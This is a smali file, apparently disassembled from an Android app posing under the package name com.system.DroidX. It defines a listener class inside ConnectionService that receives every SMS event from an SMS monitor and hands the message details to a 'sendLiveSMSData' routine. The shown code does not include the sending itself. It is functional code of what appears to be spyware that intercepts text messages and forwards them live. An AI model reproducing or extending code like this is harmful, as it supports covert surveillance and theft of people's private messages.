.class Lcom/system/DroidX/ConnectionService$1;
.super Ljava/lang/Object;
.source "ConnectionService.java"

# interfaces
.implements Lcom/system/DroidX/utils/SMSMonitor$SMSListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/system/DroidX/ConnectionService;->startLiveSMSInternal()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/system/DroidX/ConnectionService;


# direct methods
.method constructor <init>(Lcom/system/DroidX/ConnectionService;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010
        }
        names = {
            null
        }
    .end annotation

    .line 323
    iput-object p1, p0, Lcom/system/DroidX/ConnectionService$1;->this$0:Lcom/system/DroidX/ConnectionService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onSMSActivity(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 326
    iget-object v0, p0, Lcom/system/DroidX/ConnectionService$1;->this$0:Lcom/system/DroidX/ConnectionService;

    invoke-static {v0, p1, p2, p3, p4}, Lcom/system/DroidX/ConnectionService;->-$$Nest$msendLiveSMSData(Lcom/system/DroidX/ConnectionService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method
